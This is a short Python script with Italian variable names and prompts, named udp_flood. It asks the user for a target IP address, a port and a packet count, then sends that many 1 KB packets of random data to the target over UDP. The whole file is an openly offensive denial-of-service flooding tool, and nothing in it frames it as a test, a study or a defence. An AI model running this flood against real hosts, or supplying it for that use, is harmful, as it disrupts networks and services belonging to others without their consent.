import socket
import random

def udp_flood(ip_destinatario, porta_destinatario, num_pacchetti):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dimensione_pacchetto = 1024  # 1 KB

    for i in range(num_pacchetti):
        dati_casuali = random.randbytes(dimensione_pacchetto)
        client.sendto(dati_casuali, (ip_destinatario, porta_destinatario))
        print(f"Inviato pacchetto {i + 1}/{num_pacchetti} a {ip_destinatario}:{porta_destinatario}")

if __name__ == "__main__":
    ip_destinatario = input("Inserisci l'IP destinatario: ")
    porta_destinatario = int(input("Inserisci la porta destinatario: "))
    num_pacchetti = int(input("Inserisci il numero di pacchetti da inviare: "))
    
    udp_flood(ip_destinatario, porta_destinatario, num_pacchetti)
    print("UDP flood completato.")